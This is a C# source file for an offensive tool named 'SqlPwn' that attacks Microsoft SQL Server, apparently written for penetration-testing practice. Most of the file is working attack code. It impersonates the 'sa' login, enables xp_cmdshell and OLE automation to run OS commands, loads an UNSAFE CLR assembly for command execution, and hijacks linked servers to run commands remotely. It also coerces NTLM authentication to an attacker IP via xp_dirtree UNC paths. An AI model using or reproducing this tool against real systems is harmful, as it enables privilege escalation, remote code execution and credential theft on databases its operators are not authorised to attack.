using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;
using System.Text;

namespace SqlPwn
{
    public class Program
    {
        public static int Main(string[] args)
        {
            if (args.Length < 2)
            {
                usage();
                return 1;
            }

            string sqlCon = args[0];

            // get the run command 
            string runCmd = args[1];

            // get a connection
            SqlConnection con = makeCon(sqlCon);

            if (runCmd == "whoami")
            {
                runWhoami(con);
            }
            else if (runCmd == "unc")
            {
                if (args.Length == 3 && args[2] != "")
                {
                    string attacker = args[2];
                    unc(con, attacker);
                }
                else
                {
                    Console.WriteLine("[!] Missing attacker IP address");
                }
            }
            else if (runCmd == "ListImpersonate")
            {
                ListImpersonate(con);
            }
            else if (runCmd.Equals("listusers", StringComparison.OrdinalIgnoreCase))
            {
                ListUsers(con);
            }
            else if (runCmd.Equals("listsa", StringComparison.OrdinalIgnoreCase))
            {
                ListSaAccounts(con);
            }
            else if (runCmd == "impersonateSA")
            {
                impersonateSA(con);
            }
            else if (runCmd == "impersonateDBO")
            {
                impersonateDBO(con);
            }
            else if (runCmd == "sysExecXP")
            {
                if (args.Length == 3 && args[1] != "")
                {
                    string sysCmd = args[2];
                    sysExecXP(con, sysCmd);
                }
                else
                {
                    Console.WriteLine("[!] Missing command");
                }
            }
            else if (runCmd == "sysExecOLE")
            {
                if (args.Length == 3 && args[2] != "")
                {
                    string oleCmd = args[2];
                    //sysCmd = "echo Test > C:\\Tools\\file.txt";
                    sysExecOLE(con, oleCmd);
                }
                else
                {
                    Console.WriteLine("[!] Missing command");
                }
            }
            else if (runCmd == "customAssembly")
            {
                if (args.Length == 3 && args[2] != "")
                {
                    string assemCmd = args[2];
                    customAssembly(con, assemCmd);
                }
                else
                {
                    Console.WriteLine("[!] Missing command");
                }
            }
            else if (runCmd == "customAssemblyDrop")
            {
                customAssemblyDrop(con);
            }
            else if (runCmd == "links")
            {
                GetLinks(con);
            }
            else if (runCmd == "linkswhoami")
            {
                GetLinksWhoami(con);
            }
            else if (runCmd == "linkpwn")
            {
                if (args.Length == 4 && args[2] != "" && args[3] != "")
                {
                    LinkPwn(con, args[2], args[3]);
                }
                else
                {
                    Console.WriteLine("[!] Error: Incorrect syntax");
                    Console.WriteLine("[!] .\\SqlPwn.exe <instance> <victim> <command>");
                }
            }
            else
            {
                usage();
                return 1;
            }
            
            con.Close();

            return 0;
        }
        public static void usage()
        {
            Console.WriteLine(".\\SqlPwn.exe <instance> <command>");
        }
        public static SqlConnection makeCon(String sqlServer)
        {
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            Console.WriteLine("[+] Attemping connection: " + conString);
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("[+] Successful Connection");
            }
            catch
            {
                Console.WriteLine("[!] Auth Failed");
                Environment.Exit(0);
            }

            return con;
        }
        public static void runWhoami(SqlConnection con)
        {
            Console.WriteLine("[+] Performing user enumeration");
            // user
            String query = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]);
            reader.Close();

            // mapped
            query = "SELECT CURRENT_USER;";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Mapped to user: " + reader[0]);
            reader.Close();

            // public
            query = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            reader.Close();

            // admin
            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 adsminRole = Int32.Parse(reader[0].ToString());
            if (adsminRole == 1)
            {
                Console.WriteLine("[+] User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of sysadmin role");
            }
            reader.Close();
        }
        public static void unc(SqlConnection con, string attacker)
        {
            string query = "EXEC master..xp_dirtree \"\\\\" + attacker + "\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            reader.Close();
        }
        public static void ListImpersonate(SqlConnection con)
        {
            string query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();
        }
        public static void ListUsers(SqlConnection con)
        {
            string query = "SELECT name,default_database_name FROM master.sys.sql_logins;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Found user: " + reader[0]);
            }
            reader.Close();
        }
        public static void ListSaAccounts(SqlConnection con)
        {
            string query = "SELECT member.name FROM sys.server_role_members rm JOIN sys.server_principals role ON rm.role_principal_id = role.principal_id  JOIN sys.server_principals member ON rm.member_principal_id = member.principal_id WHERE role.name = 'sysadmin';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Found SA: " + reader[0]);
            }
            reader.Close();

            //query = "SELECT 'Name' = sp.NAME,sp.is_disabled AS[Is_disabled] FROM sys.server_role_members rm, sys.server_principals sp WHERE rm.role_principal_id = SUSER_ID('Sysadmin') AND rm.member_principal_id = sp.principal_id;";
            query = "SELECT DISTINCT p.name AS [loginname] , p.type , p.type_desc , p.is_disabled, s.sysadmin, CONVERT(VARCHAR(10), p.create_date, 101) AS[created], CONVERT(VARCHAR(10), p.modify_date, 101) AS[update] FROM sys.server_principals p JOIN sys.syslogins s ON p.sid = s.sid JOIN sys.server_permissions sp ON p.principal_id = sp.grantee_principal_id WHERE p.type_desc IN('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP') AND p.name NOT LIKE '##%' AND(s.sysadmin = 1 OR sp.permission_name = 'CONTROL SERVER') ORDER BY p.name";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Found SA Login: " + reader[0]);
            }
            reader.Close();
        }
        public static void impersonateSA(SqlConnection con)
        {
            string query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            bool isAdmin = false;
            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
                isAdmin = true;
            }
            reader.Close();

            if (isAdmin)
            {
                query = "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Logged in as: " + reader[0]);
                reader.Close();
            }
        }
        public static void impersonateDBO(SqlConnection con)
        {
            String query = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]);
            reader.Close();

            Console.WriteLine("[+] Attempting db-user impersonation...");
            query = "use msdb; EXECUTE AS USER = 'dbo'; SELECT SYSTEM_USER;";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]);
            reader.Close();
        }

        public static void sysExecXP(SqlConnection con, string sysCmd)
        {
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            String execCmd = "EXEC xp_cmdshell " + sysCmd;
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Result of command is: " + reader[0]);
            reader.Close();
        }
        public static void sysExecOLE(SqlConnection con, string sysCmd)
        {
            Console.WriteLine("[+] Executing cmd: " + sysCmd);
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + sysCmd + "\"';";
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
        }
        public static void customAssembly(SqlConnection con, string assemCmd)
        {
            // remove stale custom assembly
            customAssemblyDrop(con);

            Console.WriteLine("[+] Executing custom assembly");

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            string queryWhoami = "SELECT SYSTEM_USER;";
            String queryPrep = "EXECUTE AS LOGIN = 'sa'; use msdb; EXEC sp_configure 'show advanced options',1;  RECONFIGURE;  EXEC sp_configure 'clr enabled',1;  RECONFIGURE;  EXEC sp_configure 'clr strict security', 0;  RECONFIGURE";
            string binHex = ByteArrayToString(File.ReadAllBytes(@"C:\Tools\StoredProcedures\bin\x64\Release\StoredProcedures.dll"));
            //String queryImport = "CREATE ASSEMBLY my_assembly FROM " + binHex + " WITH PERMISSION_SET = UNSAFE;";
            String queryImport = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;";
            String queryCreate = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String execCmd = "EXECUTE AS LOGIN = 'sa'; EXEC cmdExec '" + assemCmd + "'";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(queryWhoami, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]);
            reader.Close();

            command = new SqlCommand(queryPrep, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(queryImport, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(queryCreate, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();

            Console.WriteLine("[+] Result of command is: " + reader[0]);

            reader.Close();
        }
        public static void customAssemblyDrop(SqlConnection con)
        {
            Console.WriteLine("[+] Cleaning stale custom assembly");

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            string queryDrop1 = "use msdb; DROP PROCEDURE IF EXISTS dbo.cmdExec";
            string queryDrop2 = "use msdb; DROP ASSEMBLY IF EXISTS myAssembly";
            string queryDrop3 = "use msdb; DROP ASSEMBLY IF EXISTS my_assembly";

            // 1. drop procedure
            // 2. drop assembly

            // impersonate
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            // drop procedure
            command = new SqlCommand(queryDrop1, con);
            reader = command.ExecuteReader();
            reader.Close();

            // drop assembly 
            command = new SqlCommand(queryDrop2, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(queryDrop3, con);
            reader = command.ExecuteReader();
            reader.Close();
        }
        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
        public static void execSqlCommand(SqlConnection con, string query, bool qPrint, bool qOut, string resText)
        {
            SqlCommand command = new SqlCommand(query, con);

            if (qPrint)
            {
                Console.WriteLine("[+] Query: " + query);
            }

            SqlDataReader reader = command.ExecuteReader();
            
            if (qOut)
            {
                while (reader.Read())
                {
                    if (resText == null) { resText = "results:"; }
                    Console.WriteLine("[+] " + resText  + " " + reader[0]);
                }
            }
            reader.Close();
        }
        public static void GetLinks(SqlConnection con)
        {
            String query = "EXEC sp_linkedservers;";
            execSqlCommand(con, query, false, true, "Linked SQL server:");
        }
        public static void GetLinksWhoami(SqlConnection con)
        {
            String query = "EXECUTE AS LOGIN = 'sa';";
            execSqlCommand(con, query, true, true, "Impersonating SA:");

            query = "EXEC sp_linkedservers;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            List<string> links = new List<string>();

            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Linked SQL Server: " + reader[0]);
                links.Add(Convert.ToString(reader[0]));
            }
            reader.Close();

            string[] linksarr = links.ToArray();

            foreach (string alink in linksarr)
            {
                // skip express links - causes DATALINK crash
                if (alink.Contains("EXPRESS"))
                {
                    Console.WriteLine("[!] Skipping " + alink + " due to DATALINK crashes");
                    continue;
                }

                Console.WriteLine("[+] Executing link query AT " + alink);
                query = "select * from openquery(\"" + alink + "\", 'select @@servername;');";
                execSqlCommand(con, query, true, true, "Linked SQL servername:");

                query = "select * from openquery(\"" + alink + "\", 'select SYSTEM_USER;');";
                execSqlCommand(con, query, true, true, "System User:");
            }
        }
        public static void LinkPwn(SqlConnection con, string linkSrv, string cmd)
        {
            Console.WriteLine("[+] Attempting to exploit link server " + linkSrv);
            String query = "EXEC sp_linkedservers;";
            execSqlCommand(con, query, false, true, "Linked SQL server:");
            
            // impersonate 
            Console.WriteLine("[+] Attempting to impersonate sa...");
            query = "EXECUTE AS LOGIN = 'sa'";
            execSqlCommand(con, query, false, false, null);

            // get user name
            query = "SELECT SYSTEM_USER;";
            execSqlCommand(con, query, false, true, "User after imperonation attempt:");
            
            // get first link user name
            query = "select * from openquery(\"" + linkSrv + "\", 'SELECT SYSTEM_USER');";
            execSqlCommand(con, query, false, true, "[" + linkSrv +  "] User:");

            // check admin access to first link
            Console.WriteLine("[+] Checking admin access on " + linkSrv + "");
            query = "select * from openquery(\"" + linkSrv + "\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');";
            execSqlCommand(con, query, false, true, "[" + linkSrv + "] Check sysadmin role:");

            /* // link impersonation
            query = "select * from openquery(\"SQL53\", 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''; ')";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();
            */

            // attempt impersonation
            //query = "select * from openquery(\"" + linkSrv + "\", 'EXECUTE AS LOGIN = ''sa''; SELECT SYSTEM_USER');";
            //execSqlCommand(con, query, false, true, "[" + linkSrv + "] User after imperonsation attempt:");

            // enable RPC server
            
            Console.WriteLine("[+] Attempting enable and execute xp_cmdshell");
            query = "EXEC sp_serveroption '" + linkSrv + "', 'rpc', 'true';";
            execSqlCommand(con, query, true, true, "Enable rpc options AT [" + linkSrv + "] result:");
            query = "EXEC sp_serveroption '" + linkSrv + "', 'rpc out', 'true';";
            execSqlCommand(con, query, true, true, "Enable rpc_out options AT [" + linkSrv + "] result:");
            

            // try cmdshell 
            Console.WriteLine("[+] Attempting enable and execute xp_cmdshell");
            // enable 1
            query = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkSrv + "]";
            execSqlCommand(con, query, true, true, "Enable advanced options AT [" + linkSrv + "] result:");

            // enable 2
            query = "EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT[" + linkSrv + "]";
            execSqlCommand(con, query, true, true, "Enable xp_cmdshell AT [" + linkSrv + "] result:");

            /*// enable cmdshell via link
            query = "select 1 from openquery(\"SQL53\", 'EXECUTE AS LOGIN = ''testAccount''; select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')";
            query = "select 1 from openquery(\"SQL53\", 'EXECUTE AS LOGIN = ''testAccount''; select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')";
            */

            // exec 
            Console.WriteLine("[+] Attempting to execute xp_cmdshell");
            query = "SELECT * FROM OPENQUERY(\"" + linkSrv + "\", 'select @@servername; EXECUTE AS LOGIN = ''sa''; exec xp_cmdshell ''" + cmd + "''') ";
            execSqlCommand(con, query, true, false, null);

            /*// UNC
            query = "SELECT * FROM OPENQUERY(\"" + linkSrv + "\", 'select @@servername; EXECUTE AS LOGIN = ''sa''; EXEC master..xp_dirtree \"\\\\192.168.49.83\\\\test\";') ";
            Console.WriteLine("[+] executing: " + query);
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("[+] (" + linkSrv + ") result: " + reader[0]);
            }
            reader.Close();
            */
        }
    }
}